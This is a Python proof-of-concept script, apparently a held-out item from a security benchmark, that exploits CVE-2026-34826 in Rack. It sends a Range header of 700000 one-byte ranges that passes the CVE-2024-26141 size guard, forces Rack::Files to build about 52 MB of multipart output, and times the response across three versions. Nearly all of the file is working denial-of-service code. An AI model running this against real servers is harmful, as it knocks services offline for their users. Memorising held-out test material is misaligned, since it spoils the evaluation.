#!/usr/bin/env python3
"""[HELD-OUT] bypass_poc — CVE-2026-34826 residual exploit, delivered over EXTERNAL HTTP.

Sends the CVE-2026-34826 byte-range DoS vector to the REAL running Rack web app: an HTTP
`GET /file` whose `Range:` header is 700000 copies of the 1-byte range (bytes=0-0). The SUMMED
range size is 700000 * 1 = 700000, which is <= the 900000-byte file, so it PASSES the
CVE-2024-26141 total-coverage guard on V1 (`ranges.map(&:size).sum > size` is FALSE). But the sheer
COUNT (700000 ranges) forces Rack::Files to assemble 700000 multipart parts (~52 MB body) -> the
CVE-2024-26141 fix is INCOMPLETE (it bounded TOTAL coverage, not the range COUNT).

Expected: SLOW on V1 (rack 3.1.20, the TARGET) -> HTTP 206, multi-second latency; BOUNDED on V2
(rack 3.1.21), where CVE-2026-34826 added `return nil if byte_range.count(',') >= max_ranges(100)`
-> the request is treated as "no range" -> whole 900 KB file served once (200, fast). (Also slow
on V0, whose absent guard likewise assembles all 700000 parts.)

Usage: bypass_poc.py http://127.0.0.1:28243
"""
import http.client
import socket
import sys
import time

N_RESID = 700000
HTTP_TIMEOUT_S = 15.0
HEADER = "bytes=" + ",".join(["0-0"] * N_RESID)   # summed size 700000 <= file, COUNT huge


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("GET", "/file", headers={"Range": HEADER})
        r = c.getresponse()
        total = 0
        while True:
            chunk = r.read(1 << 16)
            if not chunk:
                break
            total += len(chunk)
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "status": r.status, "bytes": total, "crash": False}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "status": "TIMEOUT", "crash": False, "timeout": True}
    except (ConnectionResetError, BrokenPipeError, http.client.RemoteDisconnected,
            http.client.IncompleteRead, ConnectionError, OSError) as e:
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "status": f"CRASH:{type(e).__name__}", "crash": True}


if __name__ == "__main__":
    import json
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:28243"
    out = run(base)
    print(json.dumps({"poc": "residual/CVE-2026-34826", "header_bytes": len(HEADER),
                      "n_ranges": N_RESID, "target": base, **out}, indent=2))
